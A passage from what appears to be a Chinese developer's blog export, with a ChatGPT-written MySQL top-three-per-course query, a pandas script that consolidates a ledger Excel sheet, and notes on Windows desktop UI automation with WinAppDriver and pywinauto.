<li>查询各科成绩前三的学生信息，这个自己写不出来，用<code>chatgpt</code>写的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT s.name AS student_name, c.coursename AS course_name, sc.Results AS course_score</span><br><span class="line">FROM score sc</span><br><span class="line">JOIN student s ON sc.ID = s.ID -- 连接score表和student表，获取学生姓名</span><br><span class="line">JOIN course c ON sc.courseID = c.courseID -- 连接score表和course表，获取课程名称</span><br><span class="line">WHERE (</span><br><span class="line">  SELECT COUNT(DISTINCT Results) -- 查询比当前成绩高的不同分数的数量</span><br><span class="line">  FROM score sc2 </span><br><span class="line">  WHERE sc2.courseID = sc.courseID AND sc2.Results &gt; sc.Results </span><br><span class="line">) &lt; 3 -- 只保留比当前成绩高的不同分数小于3个的记录，即前三名</span><br><span class="line">ORDER BY c.coursename, sc.Results DESC; -- 按照课程名称和成绩降序排序</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230614173746372.png" alt="image-20230614173746372"></p>
<ul>
<li>查询所有课程最高分数的学生信息，<strong>用查询各科成绩前三的语句，把&lt;3给为&lt;1即可</strong></li>
</ul>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>pandas处理excel</title>
    <url>/aposts/ae5c089/</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><ul>
<li><p>现有一excel如下，需要把日期和金额合并成一行</p>
<p><img src="/aposts/ae5c089/image-20211203173955957.png" alt="image-20211203173955957"></p>
</li>
<li><p>最终需要实现效果如下：</p>
<p><img src="/aposts/ae5c089/image-20211203174051646.png" alt="image-20211203174051646"></p>
</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OperateExcel</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, file_path</span>):</span><br><span class="line">        self.file_path = file_path</span><br><span class="line">        <span class="comment"># 注意header参数，取值为前面两行</span></span><br><span class="line">        self.df = pd.read_excel(file_path, sheet_name=<span class="string">&quot;日记帐&quot;</span>, header=[<span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_head</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        头部处理，格式：</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        [year, headers]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        year为年，如2021年</span></span><br><span class="line"><span class="string">        headers=[]，把所有头部值存到[]中，日期	凭证编号	车牌号	拿货吨位	卖出吨位	摘要	收入	支出	余额</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        headers = []</span><br><span class="line">        <span class="comment"># 取头部数据</span></span><br><span class="line">        head = self.df.head(<span class="number">0</span>)</span><br><span class="line">        year = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> items <span class="keyword">in</span> head:</span><br><span class="line">            <span class="comment"># ------ 处理日期,取年</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> items:</span><br><span class="line">                <span class="keyword">if</span> i.find(<span class="string">&quot;年&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">                    year = i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># ------- 处理其他头部</span></span><br><span class="line">            <span class="keyword">if</span> items[<span class="number">1</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).find(<span class="string">&quot;Unnamed&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">                headers.append(items[<span class="number">0</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">            <span class="comment"># ---- 金额后的头部，只取收入、支出、余额；</span></span><br><span class="line">            <span class="keyword">if</span> items[<span class="number">0</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).find(<span class="string">&quot;金额&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">                headers.append(items[<span class="number">1</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">        headers.insert(<span class="number">0</span>, <span class="string">&quot;日期&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> year, headers</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">         处理数据</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">         [file_name, data]</span></span><br><span class="line"><span class="string">         file_name表示将要保持的名字</span></span><br><span class="line"><span class="string">         data 表示处理好的数据，给pd.DataFrame使用，格式 &#123;&quot;金额&quot;:[1,2,3],&quot;收入&quot;:[]&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        g_head = self.get_head()</span><br><span class="line">        headers = g_head[<span class="number">1</span>]</span><br><span class="line">        year = g_head[<span class="number">0</span>]</span><br><span class="line">        month = <span class="string">&quot;&quot;</span></span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> headers:</span><br><span class="line">            data[i] = []</span><br><span class="line">        <span class="keyword">for</span> items <span class="keyword">in</span> self.df.values:</span><br><span class="line">            <span class="comment"># 合计不取数据；第一个单元格为空值说明此行为无效数据，也不取值</span></span><br><span class="line">            <span class="keyword">if</span> items[<span class="number">0</span>] == <span class="string">&#x27;合计&#x27;</span> <span class="keyword">or</span> math.isnan(items[<span class="number">0</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 处理日期值为：2021年1月1日</span></span><br><span class="line">            month = <span class="built_in">str</span>(items[<span class="number">0</span>]) + <span class="string">&quot;月&quot;</span></span><br><span class="line">            m_date = year + month + <span class="built_in">str</span>(<span class="built_in">int</span>(items[<span class="number">1</span>])) + <span class="string">&quot;日&quot;</span></span><br><span class="line">            data[<span class="string">&quot;日期&quot;</span>].append(m_date)</span><br><span class="line">            <span class="comment"># 凭证编号</span></span><br><span class="line">            num = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">2</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                num = items[<span class="number">2</span>]</span><br><span class="line">            data[<span class="string">&quot;凭证编号&quot;</span>].append(num)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 车牌号</span></span><br><span class="line">            car_num = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">3</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                car_num = items[<span class="number">3</span>]</span><br><span class="line">            data[<span class="string">&quot;车牌号&quot;</span>].append(car_num)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 拿货吨位</span></span><br><span class="line">            take_tonnage = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">4</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                take_tonnage = items[<span class="number">4</span>]</span><br><span class="line">            data[<span class="string">&quot;拿货吨位&quot;</span>].append(take_tonnage)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 卖出吨位</span></span><br><span class="line">            sell_tonnage = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">5</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                sell_tonnage = items[<span class="number">5</span>]</span><br><span class="line">            data[<span class="string">&quot;卖出吨位&quot;</span>].append(sell_tonnage)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 摘要</span></span><br><span class="line">            summary = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">6</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                summary = items[<span class="number">6</span>]</span><br><span class="line">            data[<span class="string">&quot;摘要&quot;</span>].append(summary)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 收入</span></span><br><span class="line">            revenue = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">7</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                revenue = items[<span class="number">7</span>]</span><br><span class="line">            data[<span class="string">&quot;收入&quot;</span>].append(revenue)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 支出</span></span><br><span class="line">            spend = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">8</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                spend = items[<span class="number">8</span>]</span><br><span class="line">            data[<span class="string">&quot;支出&quot;</span>].append(spend)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 余额</span></span><br><span class="line">            balance = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(items[<span class="number">9</span>]) != <span class="string">&quot;nan&quot;</span>:</span><br><span class="line">                balance = items[<span class="number">9</span>]</span><br><span class="line">            data[<span class="string">&quot;余额&quot;</span>].append(balance)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成的文件名</span></span><br><span class="line">        file_name = year + month + <span class="string">&quot;.xlsx&quot;</span></span><br><span class="line">        <span class="keyword">return</span> file_name, data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sum_data</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       新增统计处理的数据，最终给pd.DataFrame使用</span></span><br><span class="line"><span class="string">       :param data: list|表示处理好的数据，给pd.DataFrame使用，格式 &#123;&quot;金额&quot;:[1,2,3],&quot;收入&quot;:[]&#125;</span></span><br><span class="line"><span class="string">       :return: list</span></span><br><span class="line"><span class="string">       &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="comment"># 插入一行空行</span></span><br><span class="line">            data[i].append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 手动合计拿货吨位、卖出吨位、收入、支出、余额</span></span><br><span class="line">        data[<span class="string">&quot;日期&quot;</span>].append(<span class="string">&quot;合计&quot;</span>)</span><br><span class="line">        <span class="comment"># data[&quot;拿货吨位&quot;].append(sum(map(float,data[&quot;拿货吨位&quot;])))</span></span><br><span class="line">        data[<span class="string">&quot;拿货吨位&quot;</span>].append(<span class="built_in">sum</span>(data[<span class="string">&quot;拿货吨位&quot;</span>]))</span><br><span class="line">        data[<span class="string">&quot;卖出吨位&quot;</span>].append(<span class="built_in">sum</span>(data[<span class="string">&quot;卖出吨位&quot;</span>]))</span><br><span class="line">        data[<span class="string">&quot;收入&quot;</span>].append(<span class="built_in">sum</span>(data[<span class="string">&quot;收入&quot;</span>]))</span><br><span class="line">        data[<span class="string">&quot;支出&quot;</span>].append(<span class="built_in">sum</span>(data[<span class="string">&quot;支出&quot;</span>]))</span><br><span class="line">        data[<span class="string">&quot;余额&quot;</span>].append(<span class="built_in">sum</span>(data[<span class="string">&quot;余额&quot;</span>]))</span><br><span class="line">        <span class="comment"># 对手动合计拿货吨位、卖出吨位、收入、支出、余额、日期之外的合计行，写入空值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;日期&quot;</span>, <span class="string">&quot;拿货吨位&quot;</span>, <span class="string">&quot;卖出吨位&quot;</span>, <span class="string">&quot;收入&quot;</span>, <span class="string">&quot;支出&quot;</span>, <span class="string">&quot;余额&quot;</span>]:</span><br><span class="line">                data[i].append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果数据为0，填入到excel中不美观，因此改为”“，默认填进去就是不可见</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[j])):</span><br><span class="line">                <span class="keyword">if</span> data[j][k] == <span class="number">0</span>:</span><br><span class="line">                    data[j][k] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_excel</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        重新生成excel</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        g_data = self.get_data()</span><br><span class="line">        <span class="comment"># 得到要保存的文件名</span></span><br><span class="line">        file_name = g_data[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 得到处理好的数据，不包括统计</span></span><br><span class="line">        l_data = g_data[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 得到处理好的数据，包括统计</span></span><br><span class="line">        s_data = self.sum_data(l_data)</span><br><span class="line">        info_marks = pd.DataFrame(s_data)</span><br><span class="line">        writer = pd.ExcelWriter(file_name)</span><br><span class="line">        info_marks.to_excel(writer, index=<span class="literal">False</span>)</span><br><span class="line">        writer.save()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;生成excel成功，文件名为：%s&#x27;</span> % file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    file_path = <span class="string">&#x27;XXXX.xls&#x27;</span></span><br><span class="line">    o_excel = OperateExcel(file_path)</span><br><span class="line">    o_excel.generate_excel()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>取头部要取两行</li>
<li>注意nan的处理</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>pc自动化调研</title>
    <url>/aposts/5639d3cc/</url>
    <content><![CDATA[<h2 id="关于PC自动化"><a href="#关于PC自动化" class="headerlink" title="关于PC自动化"></a>关于PC自动化</h2><p>无论使用那种PC自动化工具，首先需要知道应用程序是<code>win32 API</code> 的 <code>backend</code> 为<code>「 win32 」</code>，还是<code>MS UI Automation</code> 的 <code>backend</code> 为<code>「 uia 」</code></p>
<h2 id="WinAppDriver"><a href="#WinAppDriver" class="headerlink" title="WinAppDriver"></a>WinAppDriver</h2><ul>
<li><p>它支持 Appium，可以使用 Appium-Python-Client 依赖库完成对 Windows 桌面程序的自动化操作</p>
</li>
<li><p>项目地址：<a href="https://github.com/Microsoft/WinAppDriver">https://github.com/Microsoft/WinAppDriver</a></p>
</li>
<li><p>需要注意的是，要使用 WinAppDriver 服务框架完成 Windows 的自动化，需要满足 Windows10 或 Windows Server 2016 以上系统</p>
<p>另外，它支持的应用程序包含：</p>
<ul>
<li>UWP - Universal Windows Platform</li>
<li>WinForms  -  Windows Forms</li>
<li>WPF  -  Windows Presentation Foundation</li>
<li>Win32  -  Classic Windows</li>
</ul>
</li>
</ul>
<h3 id="应用检测"><a href="#应用检测" class="headerlink" title="应用检测"></a>应用检测</h3><ul>
<li>打开<a href="https://accessibilityinsights.io/downloads/">Insights</a> 下载定位工具，检测是否能定位到元素</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20220927155045493.png" alt="image-20220927155045493"></p>
<ul>
<li>正常定位到元素</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20220927160349788.png" alt="image-20220927160349788"></p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul>
<li>开启「 开发者模式 」</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20220927160535821.png" alt="image-20220927160535821"></p>
<h3 id="下载WinAppDriver"><a href="#下载WinAppDriver" class="headerlink" title="下载WinAppDriver"></a>下载WinAppDriver</h3><ul>
<li>打开<a href="https://github.com/Microsoft/WinAppDriver/releases">链接下载</a>，截至到现在最新版本为：<code>WindowsApplicationDriver-1.2.99-win-x86.exe</code></li>
<li>运行WinAppDriver.exe</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)\Windows Application Driver&gt;WinAppDriver.exe 4727</span><br><span class="line">Windows Application Driver listening for requests at: http://127.0.0.1:4727/</span><br><span class="line">Press ENTER to exit.</span><br></pre></td></tr></table></figure>

<h3 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h3><ul>
<li>安装selenium，<strong>不能用4的版本</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install selenium==3.14.1</span><br></pre></td></tr></table></figure>

<ul>
<li>测试代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTests</span>(unittest.TestCase):</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUpClass</span>(<span class="params">self</span>):</span><br><span class="line">        desired_caps = &#123;&#125;</span><br><span class="line">        desired_caps[<span class="string">&#x27;app&#x27;</span>] = <span class="string">r&quot;C:\Windows\System32\notepad.exe&quot;</span></span><br><span class="line">        self.driver = webdriver.Remote(</span><br><span class="line">            command_executor=<span class="string">&#x27;http://127.0.0.1:4727&#x27;</span>,</span><br><span class="line">            desired_capabilities=desired_caps)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tearDownClass</span>(<span class="params">self</span>):</span><br><span class="line">        self.driver.quit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_edit</span>(<span class="params">self</span>):</span><br><span class="line">        self.driver.find_element_by_name(<span class="string">&quot;文本编辑器&quot;</span>).send_keys(<span class="string">&quot;helloword&quot;</span>)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    suite = unittest.TestLoader().loadTestsFromTestCase(SimpleTests)</span><br><span class="line">    unittest.TextTestRunner(verbosity=<span class="number">2</span>).run(suite)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看官网的<a href="https://github.com/microsoft/WinAppDriver/blob/master/Samples/Python/calculatortest.py">测试代码</a></li>
</ul>
<h2 id="pywinauto"><a href="#pywinauto" class="headerlink" title="pywinauto"></a>pywinauto</h2><ul>
<li><p>主要使用到 <code>Application</code> 类，用于应用程序管理（打开与关闭应用等）、窗口管理（最小化、最大化、关闭窗口）</p>
</li>
<li><p>同时支持控件操作和图像操作，支持<code>Win32 API</code>和<code>MS UI Automation API</code></p>
</li>
<li><p>安装</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pywinauto</span><br></pre></td></tr></table></figure>

<h3 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h3><p>　确定应用程序的可访问技术，pywinauto的后端，支持控件的访问技术：</p>
<ul>
<li>Win32 API（backend&#x3D;”win32”）- 默认的backend，MFC，VB6，VCL。简单的WinForms控件和大多数旧的应用程序</li>
<li>MS UI Automation API ( backend &#x3D; “ uia “ )：WinForms , WPF , Store apps , Qt5 , 浏览器</li>
</ul>
<blockquote>
<p>注：可以借助于GUI对象检查工具来确定程序到底适用于那种backend。eg：如果使用 inspect 的uia模式，可见的控件和属性更多的话，backend可选uia，反之，backend可选win32。</p>
</blockquote>
<ul>
<li><p>常用的<a href="https://github.com/blackrosezy/gui-inspect-tool">检查工具</a>：</p>
<ul>
<li><p>Inspect（定位元素工具（uia））</p>
</li>
<li><p>Spy++ （定位元素工具（win32））</p>
</li>
<li><p>UI Spy （定位元素工具）</p>
</li>
<li><p>Swapy（可简单生成pywinauto代码）</p>
</li>
</ul>
</li>
</ul>
<h3 id="定位元素"><a href="#定位元素" class="headerlink" title="定位元素"></a>定位元素</h3><ul>
<li>下载Inspect后，定位桌面微信</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20220930104310955.png" alt="image-20220930104310955"></p>
<ul>
<li>用UISpy定位，需要下载.net 3.5</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20220930105530130.png" alt="image-20220930105530130"></p>
<p><img src="/aposts/5639d3cc/image-20220930110003234.png" alt="image-20220930110003234"></p>
<ul>
<li>用SPYXX.EXE定位，拖动到Finder Tool图标到微信上，识别到后点击OK</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20220930110155030.png" alt="image-20220930110155030"></p>
<ul>
<li>看到当期微信的句柄等信息</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20220930110350697.png" alt="image-20220930110350697"></p>
<ul>
<li>打开并启动app</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pywinauto.application import Application</span><br><span class="line">app = Application(backend = &quot;uia&quot;).start(r&#x27;C:\Program Files (x86)\Tencent\WeChat\WeChat.exe&#x27;) # 启动微信</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>连接app</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app = Application(backend=&#x27;uia&#x27;).connect(process=8948)  # 进程号</span><br><span class="line">app = Application().connect(handle=0x010f0c)  # 句柄</span><br><span class="line">app = Application().connect(path=&quot;D:\Office14\EXCEL.exe&quot;)  # path</span><br><span class="line">app = Application().connect(title_re=&quot;.*Notepad&quot;, class_name=“Notepad”) # 参数组合</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：<strong>应用程序必须先准备就绪，才能使用connect()，当应用程序start()后没有超时和重连的机制。在pywinauto外再启动应用程序，需要sleep，等程序start。</strong></p>
</blockquote>
<h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><h4 id="Application对象app的常用方法"><a href="#Application对象app的常用方法" class="headerlink" title="Application对象app的常用方法"></a>Application对象app的常用方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.top_window() # 返回应用程序当前顶部窗口，是WindowSpecification对象，可以继续使用对象的方法往下继续查找控件</span><br><span class="line"># eg:如：app.top_window().child_window(title=&#x27;地址和搜索栏&#x27;, control_type=&#x27;Edit&#x27;)</span><br><span class="line"></span><br><span class="line">app.window(**kwargs) # 根据筛选条件，返回一个窗口， 是WindowSpecification对象，可以继续适用对象的方法往下继续查找控件</span><br><span class="line"># eg: 微信主界面 app.window(class_name=&#x27;WeChatMainWndForPC&#x27;)</span><br><span class="line"></span><br><span class="line">app.windows(**kwargs) # 根据筛选条件返回一个窗口列表，无条件默认全部，列表项为wrapped(装饰器)对象，可以使用wrapped对象的方法，注意不是WindowSpecification对象</span><br><span class="line"># eg：[&lt;uiawrapper.UIAWrapper - &#x27;李渝的早报 - Google Chrome&#x27;, Pane, -2064264099699444098&gt;]</span><br><span class="line"></span><br><span class="line">app.kill(soft=False) # 强制关闭</span><br><span class="line">app.cpu_usage() # 返回指定秒数期间的CPU使用率百分比</span><br><span class="line">app.wait_cpu_usage_lower(threshold=2.5, timeout=None, usage_interval=None) # 等待进程CPU使用率百分比小于指定的阈值threshold</span><br><span class="line">app.is64bit() # 如果操作的进程是64-bit，返回True</span><br></pre></td></tr></table></figure>

<h4 id="控件的定位和可用方法"><a href="#控件的定位和可用方法" class="headerlink" title="控件的定位和可用方法"></a>控件的定位和可用方法</h4><p><strong>层级查找控件的方法</strong>：定位控件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通过层级查找控件相关方法</span><br><span class="line">window(**kwargs) # 用于窗口的查找</span><br><span class="line">child_window(**kwargs) # 可以无视层级的找后代中某个符合条件的元素===&gt;【最常用】</span><br><span class="line">parent() # 返回此元素的父元素,没有参数</span><br><span class="line">children(**kwargs) # 返回符合条件的子元素列表,支持索引，是BaseWrapper对象（或子类）</span><br><span class="line">iter_children(**kwargs) # 返回子元素的迭代器，是BaseWrapper对象（或子类）</span><br><span class="line">descendants(**kwargs) # 返回符合条件的所有后代元素列表,是BaseWrapper对象（或子类）</span><br><span class="line">iter_children(**kwargs) # 符合条件后代元素迭代器，是BaseWrapper对象（或子类）---&gt; 存疑，是iter_descendants？</span><br><span class="line"></span><br><span class="line">** kwargs的参数</span><br><span class="line"></span><br><span class="line"># 常用的</span><br><span class="line">class_name=None, # 类名</span><br><span class="line">class_name_re=None, # 正则匹配类名</span><br><span class="line">title=None, # 控件的标题文字，对应inspect中Name字段</span><br><span class="line">title_re=None, # 正则匹配文字</span><br><span class="line">control_type=None, # 控件类型，inspect界面LocalizedControlType字段的英文名</span><br><span class="line">best_match=None, # 模糊匹配类似的title</span><br><span class="line">auto_id=None, # inspect界面AutomationId字段，但是很多控件没有这个属性</span><br><span class="line"></span><br><span class="line"># 不常用</span><br><span class="line">parent=None,</span><br><span class="line">process=None,# 这个基本不用，每次启动进程都会变化</span><br><span class="line">top_level_only=True,</span><br><span class="line">visible_only=True,</span><br><span class="line">enabled_only=False,</span><br><span class="line">handle=None,</span><br><span class="line">ctrl_index=None,</span><br><span class="line">found_index=None,</span><br><span class="line">predicate_func=None,</span><br><span class="line">active_only=False,</span><br><span class="line">control_id=None,</span><br><span class="line">framework_id=None,</span><br><span class="line">backend=None,</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>控件可用的方法属性</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以下几个只支持窗口模式的控件</span><br><span class="line">dlg.close() # 关闭界面</span><br><span class="line">dlg.minimize() # 最小化界面</span><br><span class="line">dlg.maximize() # 最大化界面</span><br><span class="line">dlg.restore() # 将窗口恢复为正常大小，比如最小化的让他正常显示在桌面</span><br><span class="line">dlg.get_show_state() # 正常0，最大化1，最小化2</span><br><span class="line">dlg.menu_select() # 菜单栏，eg：app.window.menu_select(Edit -&gt; Replace)</span><br><span class="line">dlg.exists(timeout=None, retry_interval=None) # 判断是否存在</span><br><span class="line">        #timeout：等待时间，一般默认5s</span><br><span class="line">        #retry_interval：timeout内重试时间</span><br><span class="line">dlg.wait(wait_for, timeout=None, retry_interval=None) # 等待窗口处于特定状态</span><br><span class="line">dlg.wait_not(wait_for_not, timeout=None, retry_interval=None) # 等待窗口不处于特定状态，即等待消失</span><br><span class="line">        # wait_for/wait_for_not:</span><br><span class="line">            # * &#x27;exists&#x27; means that the window is a valid handle</span><br><span class="line">            # * &#x27;visible&#x27; means that the window is not hidden</span><br><span class="line">            # * &#x27;enabled&#x27; means that the window is not disabled</span><br><span class="line">            # * &#x27;ready&#x27; means that the window is visible and enabled</span><br><span class="line">            # * &#x27;active&#x27; means that the window is active</span><br><span class="line">        # timeout:等待多久</span><br><span class="line">        # retry_interval:timeout内重试时间</span><br><span class="line">        # eg: dlg.wait(&#x27;ready&#x27;)</span><br><span class="line"></span><br><span class="line"># 鼠标键盘操作，只列举了常用形式，他们有很多默认参数但不常用，可以在源码中查看</span><br><span class="line">ctrl.click_input() # 最常用的点击方法，一切点击操作的基本方法（底层调用只是参数不同），左键单击，使用时一般都使用默认不需要带参数</span><br><span class="line">ctrl.right_click_input() # 鼠标右键单击</span><br><span class="line">ctrl.type_keys(keys, pause = None, with_spaces = False,) # 键盘输入,底层还是调用keyboard.send_keys</span><br><span class="line">        # keys：要输入的文字内容</span><br><span class="line">        # pause：每输入一个字符后等待时间，默认0.01就行</span><br><span class="line">        # with_spaces：是否保留keys中的所有空格，默认去除0</span><br><span class="line">ctrl.double_click_input(button =&quot;left&quot;, coords = (None, None)) # 左键双击</span><br><span class="line">ctrl.press_mouse_input(coords = (None, None)) # 指定坐标按下左键，不传坐标默认左上角</span><br><span class="line">ctrl.release_mouse_input(coords = (None, None)) # 指定坐标释放左键，不传坐标默认左上角</span><br><span class="line">ctrl.move_mouse_input(coords=(0, 0)) # 将鼠标移动到指定坐标，不传坐标默认左上角</span><br><span class="line">ctrl.drag_mouse_input(dst=(0, 0)) # 将ctrl拖动到dst,是press-move-release操作集合</span><br><span class="line"></span><br><span class="line"># 控件的常用属性</span><br><span class="line">ctrl.children_texts() # 所有子控件的文字列表，对应inspect中Name字段</span><br><span class="line">ctrl.window_text() # 控件的标题文字，对应inspect中Name字段</span><br><span class="line"># ctrl.element_info.name</span><br><span class="line">ctrl.class_name() # 控件的类名，对应inspect中ClassName字段，有些控件没有类名</span><br><span class="line"># ctrl.element_info.class_name</span><br><span class="line">ctrl.element_info.control_type # 控件类型，inspect界面LocalizedControlType字段的英文名</span><br><span class="line">ctrl.is_child(parent) # ctrl是否是parent的子控件</span><br><span class="line">ctrl.legacy_properties().get(&#x27;Value&#x27;) # 可以获取inspect界面LegacyIAccessible开头的一系列字段，在源码uiawraper.py中找到了这个方法，非常有用</span><br><span 